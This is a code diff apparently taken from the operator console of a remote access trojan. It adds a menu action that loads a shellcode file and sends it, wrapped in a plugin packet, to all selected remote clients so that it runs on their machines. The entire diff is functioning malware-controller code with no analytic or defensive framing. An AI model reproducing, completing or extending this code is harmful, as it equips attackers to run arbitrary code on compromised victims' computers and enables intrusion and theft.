@@ -2218,5 +2218,38 @@ namespace Server
                 return;
             }
         }
+
+        private void runShellcodeToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                using (OpenFileDialog openFileDialog = new OpenFileDialog())
+                {
+                    openFileDialog.Multiselect = false;
+                    openFileDialog.Filter = "(*.bin)|*.bin";
+                    if (openFileDialog.ShowDialog() == DialogResult.OK)
+                    {
+                        MsgPack packet = new MsgPack();
+                        packet.ForcePathObject("Pac_ket").AsString = "Shellcode";
+                        packet.ForcePathObject("Bin").SetAsBytes(File.ReadAllBytes(openFileDialog.FileName));
+
+                        MsgPack msgpack = new MsgPack();
+                        msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                        msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Miscellaneous.dll"));
+                        msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                        foreach (Clients client in GetSelectedClients())
+                        {
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
     }
 }
